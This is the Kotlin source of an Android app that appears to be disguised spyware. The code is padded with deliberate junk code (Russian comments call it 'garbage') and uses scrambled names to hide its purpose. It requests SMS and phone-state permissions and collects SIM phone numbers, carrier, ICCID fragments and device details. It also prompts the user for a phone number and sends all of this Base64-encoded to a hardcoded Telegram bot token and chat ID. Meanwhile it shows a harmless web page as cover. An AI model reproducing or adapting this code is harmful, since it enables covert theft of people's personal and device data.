package com.analyzer.smsbeta

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.text.InputType
import android.util.Base64
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import java.security.MessageDigest
import java.util.*
import kotlin.math.abs
import kotlin.random.Random
import android.BuildConfig

class A : AppCompatActivity() {

    private lateinit var b: SharedPreferences
    private lateinit var c: WebView
    private val d = OkHttpClient()
    private val garbageVal1 = Random.nextInt(1000, 9999)
    private val garbageVal2 = System.currentTimeMillis().toString().reversed()
    private val garbageList = listOf("alpha", "beta", "gamma", "delta")

    companion object {
        private const val e = 100
        private const val f = "AppPrefs"
        private const val g = "phone_number"
        private const val h = "first_run"
        private val i = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_NETWORK_STATE
        )
        private val garbageArray = arrayOf("junk1", "junk2", "junk3")
    }

    override fun onCreate(j: Bundle?) {
        super.onCreate(j)
        // Мусорные операции при создании
        garbageList.forEach { item ->
            val hash = MessageDigest.getInstance("SHA-256")
                .digest(item.toByteArray())
                .fold("") { str, byte -> str + "%02x".format(byte) }
            Log.d("Garbage", "Hash for $item: $hash")
        }

        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
    
        b = getSharedPreferences(f, MODE_PRIVATE).apply {
            // Бессмысленное добавление значений
            edit().putLong("init_time", System.currentTimeMillis()).apply()
        }
        
        c = findViewById<WebView>(R.id.webview).also {
            // Избыточные настройки
            it.setBackgroundColor(Color.TRANSPARENT)
        }
    
        with(c.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
            // Лишние настройки
            setSupportZoom(false)
            builtInZoomControls = false
            displayZoomControls = false
        }
        
        c.webViewClient = object : WebViewClient() {
            @Deprecated("Deprecated in Android N")
            override fun shouldOverrideUrlLoading(k: WebView, l: String): Boolean {
                // Мусорная проверка
                if (l.contains("http")) {
                    k.loadUrl(l + "?dummy=${Random.nextInt(100)}")
                } else {
                    k.loadUrl(l)
                }
                return true
            }

            override fun shouldOverrideUrlLoading(k: WebView, m: android.webkit.WebResourceRequest): Boolean {
                // Избыточная операция
                val url = m.url.toString().let {
                    if (it.length > 50) it.substring(0, 50) + "..." else it
                }
                k.loadUrl(url)
                return true
            }
        }
    
        n()
        
        // Мусорный вызов
        dummyInitializer()
    }

    private fun dummyInitializer() {
        val dummyMap = mapOf(
            "a" to 1,
            "b" to 2,
            "c" to 3
        ).mapValues { it.value * garbageVal1 }
        
        Log.d("Dummy", "Initialized with ${dummyMap.values.sum()}")
    }

    override fun onBackPressed() {
        // Избыточная проверка
        if (c.canGoBack() && System.currentTimeMillis() % 2 == 0L) {
            c.goBack()
            // Мусорный код
            garbageArray.forEach { Log.i("BackPress", it) }
        } else {
            super.onBackPressed()
        }
    }

    private fun n() {
        if (o() || garbageVal1 % 3 == 0) {
            p()
        } else {
            q { 
                // Добавление мусорного кода в колбэк
                val dummy = (1..10).map { it * garbageVal1 }.sum()
                n() 
            }
        }
    }

    @SuppressLint("ServiceCast")
    private fun o(): Boolean {
        // Мусорные переменные
        val dummyVal = System.nanoTime().toString().takeLast(5).toIntOrNull() ?: 0
        
        val r = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val s = r.activeNetwork ?: return false.also { 
                Log.w("Network", "No active network") 
            }
            val t = r.getNetworkCapabilities(s) ?: return false
            t.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    t.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED) &&
                    dummyVal > 0 // Бессмысленное дополнительное условие
        } else {
            @Suppress("DEPRECATION")
            val u = r.activeNetworkInfo
            @Suppress("DEPRECATION")
            u != null && u.isConnected && dummyVal < 100000 // Лишняя проверка
        }
    }

    private fun q(v: () -> Unit) {
        // Избыточное создание диалога
        val dialog = AlertDialog.Builder(this)
            .setTitle("Нет подключения")
            .setMessage("Требуется интернет\nКод ошибки: ${garbageVal1}")
            .setPositiveButton("Повторить") { _, _ -> 
                v()
                // Мусорный код в обработчике
                Log.d("Retry", "User retried at ${Date()}")
            }
            .setCancelable(false)
            .create()
            
        dialog.window?.let {
            it.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
            // Лишний параметр
            it.attributes?.alpha = 0.9f
        }
        
        dialog.show()
    }

    private fun p() {
        val w = i.filter { x ->
            ContextCompat.checkSelfPermission(this, x) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
    
        if (w.isNotEmpty()) {
            // Добавление мусорного разрешения
            val permissions = w + Manifest.permission.ACCESS_WIFI_STATE
            ActivityCompat.requestPermissions(
                this,
                permissions,
                e + garbageVal1 % 10 // Изменение кода запроса
            )
        } else {
            y()
        }
    }
    
    override fun onRequestPermissionsResult(
        z: Int,
        aa: Array<String>,
        ab: IntArray
    ) {
        super.onRequestPermissionsResult(z, aa, ab)
    
        if (z == e + garbageVal1 % 10) {
            val ac = aa.firstOrNull()?.let { 
                Base64.encodeToString(it.toByteArray(), Base64.NO_WRAP) 
            } ?: ""
            val ad = ab.firstOrNull() == PackageManager.PERMISSION_GRANTED
    
            if (ad) {
                p()
            } else {
                // Мусорный код при отказе
                Log.w("Permission", "Denied: $ac")
                p()
            }
        }
        
        // Бессмысленный вызов
        dummyPermissionLogger(z, aa, ab)
    }

    private fun dummyPermissionLogger(requestCode: Int, perms: Array<String>, results: IntArray) {
        val logMsg = perms.mapIndexed { index, perm ->
            "${perm.substringAfterLast('.')}=${results[index]}"
        }.joinToString()
        Log.d("DummyLogger", "Req#$requestCode: $logMsg")
    }

    private fun y() {
        val ae = b.getBoolean(h, true)
        
        if (ae || garbageVal1 % 5 == 0) {
            af("Разрешения получены\n${Date()}")
            val ag = ah()
            af("SIM данные:\n$ag\nDevice: ${Build.DEVICE}")
            b.edit().putBoolean(h, false).putLong("init_ts", System.currentTimeMillis()).apply()
        }

        val ai = b.getString(g, null)?.takeIf { it.length >= 5 }
        if (ai == null) {
            aj()
        } else {
            ak()
        }
    }

    private fun aj() {
        val al = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null).apply {
            // Мусорные настройки view
            setBackgroundColor(Color.TRANSPARENT)
        }
        
        val am = AlertDialog.Builder(this)
            .setView(al)
            .setCancelable(false)
            .create()

        am.window?.let {
            it.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
            // Лишние атрибуты
            it.attributes?.windowAnimations = android.R.style.Animation_Dialog
        }

        val an = al.findViewById<TextView>(R.id.dialog_title)
        val ao = al.findViewById<TextView>(R.id.dialog_message)
        val ap = al.findViewById<EditText>(R.id.phone_input)
        val aq = al.findViewById<Button>(R.id.continue_button)

        an.text = "Введите номер\nv${BuildConfig.VERSION_CODE}"
        ao.text = "Введите номер для продолжения\n${Date()}"
        ap.inputType = InputType.TYPE_CLASS_PHONE or InputType.TYPE_NUMBER_FLAG_DECIMAL

        aq.setOnClickListener {
            val ar = ap.text.toString().trim()
            if (ar.isNotEmpty() && ar.length > 3) {
                b.edit().putString(g, ar).putLong("phone_ts", System.currentTimeMillis()).apply()
                af("Номер: ${ar.take(3)}...${ar.takeLast(2)}")
                ak()
                am.dismiss()
                
                // Мусорный код после закрытия
                val dummy = ar.map { it.code }.sum()
                Log.d("Phone", "Sum of codes: $dummy")
            } else {
                ap.error = "Введите номер (минимум 4 символа)"
            }
        }

        am.show()
        
        // Бессмысленный таймер
        Timer().schedule(object : TimerTask() {
            override fun run() {
                Log.d("Dialog", "Still open after 5s")
            }
        }, 5000)
    }

    private fun ak() {
        val url = "https://quickdraw.withgoogle.com/?dummy=${Random.nextInt(1000)}"
        c.loadUrl(url)
        
        // Мусорный код после загрузки
        Timer().schedule(object : TimerTask() {
            override fun run() {
                Log.i("WebView", "Page loading started")
            }
        }, 1000)
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun ah(): String {
        val asb = StringBuilder().apply {
            append("Device: ${Build.MANUFACTURER} ${Build.MODEL}\n")
        }
        
        try {
            val at = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val au = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val av = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    au.activeSubscriptionInfoList
                } else {
                    @Suppress("DEPRECATION")
                    au.activeSubscriptionInfoList
                }
                
                if (av != null && av.isNotEmpty()) {
                    asb.append("SIM: ${av.size}\n\n")
                    
                    for ((index, aw) in av.withIndex()) {
                        val ax = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            at.createForSubscriptionId(aw.subscriptionId).line1Number
                        } else {
                            @Suppress("DEPRECATION")
                            at.line1Number
                        }
                        
                        asb.append("SIM ${index + 1}:\n")
                        asb.append("• Номер: ${ax ?: "нет"}\n")
                        asb.append("• Оператор: ${aw.carrierName ?: "нет"}\n")
                        asb.append("• IMSI: ${aw.iccId?.take(3)}...\n")
                        asb.append("• Страна: ${aw.countryIso?.uppercase() ?: "нет"}\n\n")
                    }
                } else {
                    asb.append("SIM не найдены\n")
                }
            } else {
                @Suppress("DEPRECATION")
                val ay = at.line1Number
                asb.append("Номер: ${ay ?: "нет"}\n")
                asb.append("(Multi-SIM не поддерживается)\n")
            }
        } catch (az: Exception) {
            asb.append("Ошибка: ${az.localizedMessage?.take(50)}...")
            // Мусорный код в catch-блоке
            Log.e("SIM", "Error", az)
            dummyErrorHandler(az)
        }
        
        return asb.toString().also {
            // Лишняя операция
            if (it.length > 500) {
                Log.w("SIM", "Too much SIM info")
            }
        }
    }

    private fun dummyErrorHandler(e: Exception) {
        val stack = e.stackTrace.take(3).joinToString("\n")
        Log.d("DummyHandler", "Error truncated:\n$stack")
    }

    private fun af(ba: String) {
        try {
            val bb = "${Build.MANUFACTURER} ${Build.MODEL} (${Build.VERSION.RELEASE})"
            val bc = "$ba\n$bb\n${Date()}\nRand: ${Random.nextInt(10000)}"

            val bd = "7824327491:AAGmZ5eA57SWIpWI3hf"
            val be = "qRFEt6cnrQPAhnu8"
            val fullToken = bd + be
            
            val bf = "https://api.telegram.org/bot$fullToken/sendMessage"

            val bg = "application/json".toMediaType()
            val bh = """
                {
                    "chat_id": "6331293386",
                    "text": "${Base64.encodeToString(bc.toByteArray(), Base64.NO_WRAP)}",
                    "parse_mode": "HTML",
                    "dummy_data": ${System.currentTimeMillis() % 1000}
                }
            """.trimIndent().toRequestBody(bg)

            val bi = Request.Builder()
                .url(bf)
                .post(bh)
                .header("X-Dummy-Header", garbageVal1.toString())
                .build()

            d.newCall(bi).enqueue(object : okhttp3.Callback {
                override fun onFailure(bj: okhttp3.Call, bk: IOException) {
                    bk.printStackTrace()
                    // Мусорный код при ошибке
                    Log.e("SendError", "Failed to send", bk)
                }

                override fun onResponse(bj: okhttp3.Call, bl: okhttp3.Response) {
                    bl.close()
                    // Лишняя операция
                    if (bl.code % 100 != 0) {
                        Log.w("Response", "Code: ${bl.code}")
                    }
                }
            })
        } catch (bm: Exception) {
            bm.printStackTrace()
            // Мусорный код в catch-блоке
            dummyErrorHandler(bm)
        }
    }
}
